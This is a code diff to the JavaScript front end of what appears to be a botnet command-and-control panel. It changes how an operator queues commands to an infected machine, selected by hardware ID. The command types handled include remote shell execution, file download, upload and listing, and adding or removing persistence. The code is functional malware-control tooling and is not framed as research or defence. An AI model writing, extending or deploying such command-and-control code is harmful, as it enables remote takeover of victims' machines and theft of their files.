@@ -445,12 +445,27 @@ async function handleCommandSubmit(e) {
   if (!state.selectedBot) return;
 
   const form = e.target;
-  const command = form.command.value;
-  const args = form.args.value;
+  const command_type = form.command.value;
+  const rawArgs = form.args.value.trim();
+
+  // Build args object. Try JSON first, then per-command fallbacks.
+  let args = {};
+  if (rawArgs) {
+    try {
+      args = JSON.parse(rawArgs);
+    } catch (_) {
+      // Plain text — wrap based on command type
+      if (command_type === 'shell') args = { command: rawArgs };
+      else if (command_type === 'file_download' || command_type === 'file_list') args = { path: rawArgs };
+      else if (command_type === 'file_upload') args = { path: rawArgs };
+      else if (command_type === 'persist_add' || command_type === 'persist_remove') args = { method: rawArgs };
+      else args = { command: rawArgs };
+    }
+  }
 
   try {
-    await api.post(`/api/bots/${state.selectedBot.hwid}/commands`, { command, args });
-    showToast('Command sent', 'success');
+    await api.post(`/api/bots/${state.selectedBot.hwid}/commands`, { command_type, args });
+    showToast('Command queued', 'success');
     form.args.value = '';
     loadBotDetail(state.selectedBot.hwid);
   } catch (err) {
